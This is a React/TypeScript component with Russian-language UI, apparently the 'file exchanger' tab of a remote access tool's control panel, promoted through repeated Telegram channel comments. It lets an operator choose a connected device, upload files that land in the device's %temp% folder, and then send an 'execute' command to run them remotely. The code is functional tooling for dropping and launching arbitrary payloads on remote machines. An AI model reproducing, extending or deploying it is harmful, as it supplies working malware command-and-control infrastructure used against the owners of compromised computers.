// t.me/SentinelLinks

"use client"

import type React from "react"
import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { Upload, Play, Trash2, FileIcon, WifiOff, CheckCircle, Loader2 } from "lucide-react"
import type { User } from "@/app/page"
import { toast } from "sonner"

interface FileUploadTabProps {
  selectedUser: User | null
}

interface UploadedFile {
  id: string
  name: string
  size: string
  status: "ready" | "uploading" | "uploaded" | "running" | "error"
}

export function FileUploadTab({ selectedUser }: FileUploadTabProps) {
  const [uploadedFiles, setUploadedFiles] = useState<UploadedFile[]>([])
  const [isDragging, setIsDragging] = useState(false)

// t.me/SentinelLinks
  const handleFileSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files
    if (!files || !selectedUser) return

    Array.from(files).forEach(async (file) => {
      const newFile: UploadedFile = {
        id: Math.random().toString(36).substr(2, 9),
        name: file.name,
        size: formatFileSize(file.size),
        status: "uploading",
      }

      setUploadedFiles((prev) => [...prev, newFile])

      try {
        const formData = new FormData()
        formData.append("file", file)

        const response = await fetch("/api/files", {
          method: "POST",
          headers: {
            "X-Client-Id": selectedUser.id,
          },
          body: formData,
        })

        const result = await response.json()

        if (result.success) {
          setUploadedFiles((prev) => prev.map((f) => (f.id === newFile.id ? { ...f, status: "uploaded" as const } : f)))
          toast.success("Файл загружен", { description: `${file.name} загружен в %temp%` })
        } else {
          throw new Error(result.error || "Ошибка загрузки")
        }
      } catch (error) {
        console.error("File upload error:", error)
        setUploadedFiles((prev) => prev.map((f) => (f.id === newFile.id ? { ...f, status: "error" as const } : f)))
        toast.error("Ошибка загрузки", {
          description: error instanceof Error ? error.message : "Неизвестная ошибка",
        })
      }
    })
  }

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault()
    setIsDragging(true)
  }

  const handleDragLeave = () => {
    setIsDragging(false)
  }

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault()
    setIsDragging(false)

    const files = e.dataTransfer.files
    if (files.length > 0) {
      const event = {
        target: { files },
      } as unknown as React.ChangeEvent<HTMLInputElement>
      handleFileSelect(event)
    }
  }

  const handleRunFile = async (fileId: string) => {
    const file = uploadedFiles.find((f) => f.id === fileId)
    if (!file || !selectedUser) return

    setUploadedFiles((prev) => prev.map((f) => (f.id === fileId ? { ...f, status: "running" as const } : f)))

    try {
      const response = await fetch("/api/files", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Client-Id": selectedUser.id,
        },
        body: JSON.stringify({
          action: "execute",
          fileName: file.name,
        }),
      })

      const result = await response.json()

      if (result.success) {
        toast.success("Файл запущен", { description: file.name })
        setTimeout(() => {
          setUploadedFiles((prev) => prev.map((f) => (f.id === fileId ? { ...f, status: "uploaded" as const } : f)))
        }, 2000)
      } else {
        throw new Error(result.error || "Ошибка запуска")
      }
    } catch (error) {
      console.error("File execute error:", error)
      toast.error("Ошибка запуска", {
        description: error instanceof Error ? error.message : "Неизвестная ошибка",
      })
      setUploadedFiles((prev) => prev.map((f) => (f.id === fileId ? { ...f, status: "uploaded" as const } : f)))
    }
  }

  const handleDeleteFile = (fileId: string) => {
    setUploadedFiles((prev) => prev.filter((f) => f.id !== fileId))
  }

  const formatFileSize = (bytes: number): string => {
    if (bytes === 0) return "0 Bytes"
    const k = 1024
    const sizes = ["Bytes", "KB", "MB", "GB"]
    const i = Math.floor(Math.log(bytes) / Math.log(k))
    return Math.round((bytes / Math.pow(k, i)) * 100) / 100 + " " + sizes[i]
  }

  const getStatusIcon = (status: UploadedFile["status"]) => {
    switch (status) {
      case "uploading":
      case "running":
        return <Loader2 className="w-4 h-4 animate-spin" />
      case "uploaded":
        return <CheckCircle className="w-4 h-4 text-green-500" />
      default:
        return null
    }
  }

  const getStatusText = (status: UploadedFile["status"]) => {
    switch (status) {
      case "uploading":
        return "Загрузка..."
      case "uploaded":
        return "Готов к запуску"
      case "running":
        return "Выполняется..."
      case "error":
        return "Ошибка"
      default:
        return "Готово"
    }
  }

  if (!selectedUser) {
    return (
      <div className="flex-1 flex items-center justify-center bg-background">
        <div className="text-center">
          <div className="w-24 h-24 rounded-2xl bg-gradient-to-br from-primary/20 to-accent/20 flex items-center justify-center mx-auto mb-6">
            <WifiOff className="w-12 h-12 text-muted-foreground" />
          </div>
          <h3 className="text-xl font-semibold mb-2">Нет подключения</h3>
          <p className="text-muted-foreground">Выберите устройство для загрузки файлов</p>
        </div>
      </div>
    )
  }

// t.me/SentinelLinks
  return (
    <div className="flex-1 bg-background p-6 overflow-auto">
      <div className="max-w-4xl mx-auto space-y-6">
        <div>
          <h2 className="text-2xl font-bold">Файлообменник</h2>
          <p className="text-sm text-muted-foreground mt-1">Загрузите файл на устройство {selectedUser.name}</p>
        </div>

        <Card
          className={`p-8 border-2 border-dashed transition-colors ${
            isDragging ? "border-primary bg-primary/5" : "border-border"
          }`}
          onDragOver={handleDragOver}
          onDragLeave={handleDragLeave}
          onDrop={handleDrop}
        >
          <div className="text-center space-y-4">
            <div className="w-16 h-16 rounded-2xl bg-muted flex items-center justify-center mx-auto">
              <Upload className="w-8 h-8 text-muted-foreground" />
            </div>
            <div>
              <h3 className="text-lg font-semibold mb-2">Перетащите файлы сюда</h3>
              <p className="text-sm text-muted-foreground mb-4">или выберите файл с компьютера</p>
            </div>
            <div>
              <input type="file" id="file-upload" multiple onChange={handleFileSelect} className="hidden" />
              <label htmlFor="file-upload">
                <Button asChild className="cursor-pointer">
                  <span>
                    <Upload className="w-4 h-4 mr-2" />
                    Выбрать файл
                  </span>
                </Button>
              </label>
            </div>
          </div>
        </Card>

// t.me/SentinelLinks
        {uploadedFiles.length > 0 && (
          <Card className="p-4">
            <h3 className="text-lg font-semibold mb-4">Загруженные файлы</h3>
            <div className="space-y-2">
              {uploadedFiles.map((file) => (
                <div key={file.id} className="flex items-center justify-between p-4 rounded-lg bg-muted/50">
                  <div className="flex items-center gap-3 flex-1">
                    <div className="w-10 h-10 rounded-lg bg-muted flex items-center justify-center">
                      <FileIcon className="w-5 h-5 text-muted-foreground" />
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="font-medium text-sm truncate">{file.name}</p>
                      <div className="flex items-center gap-2 text-xs text-muted-foreground">
                        <span>{file.size}</span>
                        <span>•</span>
                        {getStatusIcon(file.status)}
                        <span>{getStatusText(file.status)}</span>
                      </div>
                    </div>
                  </div>
                  <div className="flex gap-2">
                    <Button
                      variant="default"
                      size="sm"
                      onClick={() => handleRunFile(file.id)}
                      disabled={file.status !== "uploaded"}
                    >
                      <Play className="w-4 h-4 mr-2" />
                      Запустить
                    </Button>
                    <Button
                      variant="ghost"
                      size="icon"
                      onClick={() => handleDeleteFile(file.id)}
                      disabled={file.status === "uploading" || file.status === "running"}
                    >
                      <Trash2 className="w-4 h-4" />
                    </Button>
                  </div>
                </div>
              ))}
            </div>
          </Card>
        )}
      </div>
    </div>
  )
}

//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
